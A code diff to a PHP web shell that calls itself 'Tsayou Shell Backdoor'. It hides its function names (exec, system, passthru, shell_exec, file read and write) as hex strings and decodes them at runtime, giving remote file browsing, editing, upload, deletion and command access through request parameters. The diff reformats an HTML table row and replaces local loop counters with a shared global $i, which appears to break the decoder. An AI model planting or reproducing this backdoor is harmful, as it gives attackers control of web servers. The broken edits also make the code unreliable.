@@ -1,5 +1,6 @@
 <?php
 define("__self__", "Ts\x61y\x6fu Sh\x65l\x6c B\x61\x63k\x64o\x6fr");
+$i = 10*0;
 $x = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65", "65786563", "7061737374687275", "73797374656d", "7368656c6c5f65786563", "7068705f756e616d65", "6f625f7374617274", "6f625f6765745f636c65616e", "7363616e646972", "66696c6573697a65", "66696c657065726d73",);
 foreach ($x as $k => $v) $x[$k] = cv($v);
 $p = ((isset($_GET["p"]) ? cv($_GET["p"]) : $x[2]()));
@@ -34,19 +35,7 @@ $shwf = function () {
       if (!$x[7]("$p/$f")) continue;
       $sz = $x[29]("$p/$f")/1024;
       $sz = round($sz, 3);
-      echo "
-      <tr>
-         <td><a href=\"?p=".cv($p, 0)."&a=0x0&n=".cv($f, 0)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$x[19]("Y-m-d H:i", $x[20]("$p/$f"))."\"><i class=\"fa fa-file\"></i> $f</a></td>
-         <td>".(($sz > 1024) ? round($sz/1024, 2)."MB" : $sz."KB")."</td>
-         <td><font color=\"".(($x[8]("$p/$f")) ? "#00ff00" : (!$x[9]("$p/$f") ? "red" : null))."\">".perm("$p/$f")."</font></td>
-         <td>
-            <a href=\"?p=".cv($p, 0)."&a=0x5&n=".cv($f, 0)."\"><i class=\"fa fa-edit fa-fw\"></i></a>
-            <a href=\"?p=".cv($p, 0)."&a=0x4&n=".cv($f, 0)."&t=f\"><i class=\"fa fa-pencil fa-fw\"></i></a>
-            <a href=\"?p=".cv($p, 0)."&a=0x00&n=".cv($f, 0)."\" class=\"delete\" data-type=\"file\"><i class=\"fa fa-trash fa-fw\"></i></a>
-            <a href=\"?p=".cv($p, 0)."&n=".cv($f, 0)."&download"."\"><i class=\"fa fa-download fa-fw\"></i></a>
-         </td>
-      </tr>
-      ";
+      echo "<tr><td><a href=\"?p=".cv($p, 0)."&a=0x0&n=".cv($f, 0)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$x[19]("Y-m-d H:i", $x[20]("$p/$f"))."\"><i class=\"fa fa-file\"></i> $f</a></td><td>".(($sz > 1024) ? round($sz/1024, 2)."MB" : $sz."KB")."</td><td><font color=\"".(($x[8]("$p/$f")) ? "#00ff00" : (!$x[9]("$p/$f") ? "red" : null))."\">".perm("$p/$f")."</font></td><td><a href=\"?p=".cv($p, 0)."&a=0x5&n=".cv($f, 0)."\"><i class=\"fa fa-edit fa-fw\"></i></a><a href=\"?p=".cv($p, 0)."&a=0x4&n=".cv($f, 0)."&t=f\"><i class=\"fa fa-pencil fa-fw\"></i></a><a href=\"?p=".cv($p, 0)."&a=0x00&n=".cv($f, 0)."\" class=\"delete\" data-type=\"file\"><i class=\"fa fa-trash fa-fw\"></i></a><a href=\"?p=".cv($p, 0)."&n=".cv($f, 0)."&download"."\"><i class=\"fa fa-download fa-fw\"></i></a></td></tr>";
    }
 };
 
@@ -64,7 +53,7 @@ function dd($d) {
    }
 }
 function cv($s, $t = 1) {
-   $i = 0;
+   global $i;
    $r = "";
    if ($t)
       for (; $i < (strlen($s)-1); $i += 2) $r .= chr(hexdec($s[$i].$s[$i+1]));
@@ -203,7 +192,7 @@ function perm($f) {
       <?php
       if (isset($_FILES["f"])) {
          $n = $_FILES["f"]["name"];
-         for ($i = 0; $i < count($n); $i++) {
+         for (; $i < count($n); $i++) {
             if ($x[11]($_FILES["f"]["tmp_name"][$i], $n[$i])) {
                a("file uploaded successfully");
             } else {
